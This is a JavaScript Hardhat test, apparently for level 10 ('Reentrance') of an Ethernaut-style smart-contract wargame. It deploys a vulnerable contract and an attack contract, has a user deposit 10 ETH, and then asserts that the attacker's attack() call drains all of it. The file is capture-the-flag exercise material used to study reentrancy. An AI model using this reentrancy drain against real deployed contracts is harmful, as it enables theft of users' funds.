const { assert } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("10-Reentrance", async function () {
    let deployer, attacker, reentrance, reentranceAttack
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        user = accounts[2]
        await deployments.fixture(["10"])
        reentrance = await ethers.getContract("Reentrance")
        reentranceAttack = await ethers.getContract("ReentranceAttack", attacker.address)
    })
    it("should steal all of the funds", async function () {
        // different user deposits 10 ETH
        const userDeposit = ethers.utils.parseEther("10")
        await reentrance.connect(user).donate(user.address, { value: userDeposit })
        assert.equal((await reentrance.balanceOf(user.address)).toString(), userDeposit.toString())

        // attacker steals the ETH
        const initialDonationAmount = ethers.utils.parseEther("1")
        const attackerBalanceBefore = await attacker.getBalance()
        const tx = await reentranceAttack.attack({ value: initialDonationAmount })

        // check funds have been stolen
        const txReceipt = await tx.wait()
        const attackerBalanceAfter = await attacker.getBalance()
        const spentOnGas = txReceipt.effectiveGasPrice.mul(txReceipt.gasUsed)
        assert.equal(
            attackerBalanceAfter.toString(),
            attackerBalanceBefore.add(userDeposit).sub(spentOnGas).toString()
        )
        assert.equal((await ethers.provider.getBalance(reentrance.address)).toString(), "0")
    })
})
